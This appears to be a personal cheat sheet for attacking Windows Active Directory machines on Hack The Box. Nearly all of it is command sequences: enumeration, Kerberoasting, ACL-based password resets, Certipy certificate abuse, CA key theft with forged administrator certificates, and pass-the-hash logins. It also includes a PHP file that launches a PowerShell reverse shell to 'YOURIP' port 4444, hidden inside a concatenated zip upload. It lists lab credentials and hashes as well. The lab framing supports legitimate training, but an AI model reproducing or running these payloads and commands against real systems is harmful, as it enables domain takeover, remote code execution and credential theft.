## This is for the windows targets:
Ports to pay attention:
445 SMB
389 LDAP
1433 MSSQL

normally you will get some creds for win machines.
You should try them to find what they are for


**enumeration:**

gobuster dir -u "http://name.htb" -w /usr/share/wordlists/seclists/Discovery/Web-Content/dire....txt -t 100 -x php (windows usually use php files)


1) netexec ldap <targetIP> -u <username> -p <password>
and you will get smb and ldap confirmation

2) nxc smb <TargetIP> -u '<username>' -p '<password>' --shares
and you getw all the smb shares

3) crackmapexec smb <targetIP> -u <username> -p <password> --users or --computers

and now you get the info you wanted:

1) smbclient -L //targetip -U <username>
and then
2) smbclient //targetip -U <username>
>ls
and you get the files
3)

Then use bloodhund to find the connections and then use impacet tools.

---------------------------------------------------------------------------------------------------------
## An all around windows check guide

1. you do the normal scans (nmap for tcp and udp, rustscan)
2. 


---------------------------------------------------------------------------------------------------------
1. crackmapexec smb xx.xx.xx.xx -u levi.james -p 'KingofAkron2025!' --users                          (the creds are given)
2. nxc smb PUPPY.HTB -u 'levi.james' -p 'KingofAkron2025!' --rid-brute | grep "SidTypeUser" | awk -F '\\' '{print
$2}' | awk '{print $1}' > users.txt                                                      (just creates a .txt with all users)

3. use bloodhound to see all the connections
4. if your user has "GenericWrite" at someone else you can change his password
5. crackmapexec smb xx.xx.xx.xx -u levi.james -p 'KingofAkron2025!' --shares
6. smbclient \\\\xx.xx.xx.xx\\DEV -U "levi.james"
7. try dir and get filename

bloodyAD -u ant.edwards -p 'Antman2025!' -d puppy.htb --dc-ip <ip> set password adam.silver 'abc@123'

save into modify.ldif

dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
changetype: modify
replace: userAccountControl
userAccountControl: 512

ldapmodify -x -H ldap://10.10.11.70 -D "ant.edwards@puppy.htb" -w 'Antman2025!' -f modify.ldif

evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'abc@123'


----------------------------------------------------------------------------------------------------------------------
**Bloodhound is a must!** with creds
1. bloodhound-python -u name -p password -d domain.htb -ns ip -c all --zip
The next part is different everytime
2. If you have **WriteSPN**:
    you need this: https://github.com/ShutdownRepo/targetedKerberoast (git clone it) /n
   a. ntpdate -u IP
   b. faketime "2025-06-09 16:22:00" python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --dc-ip 10.10.11.72
   c. hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
  If you have **AddSelf**:
   a. nano randomname.ldif
     dn: CN=<thetargetname>,CN=Users,DC=<domain>,DC=htb
     changetype: modify
     add: member
     member: CN=<targetuser>,CN=Users,DC=<domain>,DC=htb
   b. ldapmodify -x -D "domain\targetusername" -w <password> -H ldap://ip -f randomname.ldif
  If you have **ReadGMSAPassword**:
   a. git clone : https://github.com/micahvandeusen/gMSADumper
   b. python3 gMSADumper.py -u name -p password -l ip -d domain.htb
   and you will get a hash but you cant crack it yet.
  If you have **ForcechangePassword**:
   a. bloodyAD -u 'userfrombefore$' -p ':1c37d00093dc2acf25a7z7f2d471fake4afdcthehashfrombefore' -d domain.htb --dc-ip ip set password sanm 'Password123!'
  If you have **WriteOwner**:
   a. impacket-owneredit -action write -new-owner 'sam' -target 'john' 'domain/sam:Password123!' -dc-ip ip
   b. impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sam' -target-dn "CN=john,CN=Users,DC=domainname,DC=htb" 'domainname.htb/sam:Password123!' -dc-ip ip
   c. bloodyAD -d domainanme.htb -u 'sam' -p 'Password123!' --dc-ip ip set password john 'NewPa$$word'
   d. evil-winrm -i ip -u john -p 'NewPa$$word'


----------------------------------------------------------------------------------------------------------------------
1. sudo rdate -n 10.10.11.69  (windows machinesusually need to have the same time as target)
if this doesnt stay try: faketime

2. sudo responder -I tun0 -v
and
smbclient //targetip/IT -U <name>%<password> -c "put <filename>"    to upload a file at smb with write prev

ntpdate -u "ip"

faketime '2025-05-27 20:41:00' certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account ca_svc

export KRB5CCNAME=ca_svc.ccache

 faketime '2025-05-27 20:43:00' certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -user 'ca_svc' read

faketime '2025-05-27 20:43:00' certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update

faketime '2025-05-27 20:44:00' certipy-ad req  -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'

faketime '2025-05-27 20:45:00' certipy-ad account -u 'ca_svc' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update


faketime '2025-05-27 20:46:00' certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'domain.htb' -dc-ip targetIP

evil-winrm -i targetIP -u administrator -H 'hash' 

-------------------------------------------------------------------------------------------------------------------------------------------------------
(NO CREDS WINDOWS MACHINE)
1. you need good enumeration + create an account at the website:
   gobuster dir ....... +x php   (windows site usually have .php files)
   ffuf ...... 
2. add---> echo '10.10.11.xx name.htb DC01.name.htb' | sudo tee -a /etc/hosts
3. if you found something like ..../upload.php?s_id=1
   try fuzzing it with ffuf or burpsuite
find the right id and there you will find a website that you can upload zip file

4. ZipSlip  (it allows attackers upload a zip file which has a legit file.pdf adn then your malware)
a) echo "hi" > legit.pdf
b) zip legit.zip legit.pdf
c) nano shell.php and put inside this:
  <?php
shell_exec("powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('YOURIP',4444); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\"");
?>

and do: zip mal.zip shell.php
and: cat legit.zip mal.zip > combined.zip
and upload this zip

d) nc -lvnp 4444
e) then go where this file has saved, meybe: ..../uploads/shell.php

5. now you have a rce as xamppuser. Try to find usefull files like databases and hashes.
use type filename
6. if you find hashes try:
hashcat -a 0 -m hashid -w /usr/share/wordlists/rockyou.txt
7. and log in with evilrm to thuis account and then use bloodhound to find the connections
8. usually you will be able to change a password with:
net rpc password "targetname" "newP@ssword2022" -U "domainanme.htb"/"yourusername"%"thecodeyoufoundfromhash" -S domainanmeagain.htb        (all this on your machine)

9. and this user will have soem rights. you can check with bloodhound and then try to login with evilrm and try:
whoami /priv

if you found seManageVolumePrivilege: then you have the rights to manage The file system like C.
it has the exploit: https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
you dowenload this .exe file at your pc
and then you evilrm at the user fro mthis directory and press: upload .....exe

10. now you run it there: .\SeManageVolumeExploit.exe

and this user now has full control over C
Your target is the Certification authorities CA
11. certutil -exportPFX my "domainanme-LTD-CA" C:\Users\Public\ca.pfx
12. go at the download file at \Public ---> cd Public

13. download ca.pfx    ( PFX IS THE TYPE THAT CA ARA STORED)
14. then at your pc forge a fake administrator.pfx:
   certipy-ad forge -ca-pfx ca.pfx -upn 'administrator@domainanme.htb' -subject 'CN=Administrator,CN=Users,DC=domainanme,DC=htb' -out forged_admin.pfx

15. and now abuse ceripy to auth this ca with kerberos tgt:
certipy-ad auth 0pfx forged_admin.pfx -dc-ip 10.10.11.x -username 'administrator' -domain 'domainanme.htb'

16. You are ready to connect with evil-winrm:
evil-winrm -i 10.10.11.x -u administrator -H'd803303515bf814ac14c5f1702abh866....'


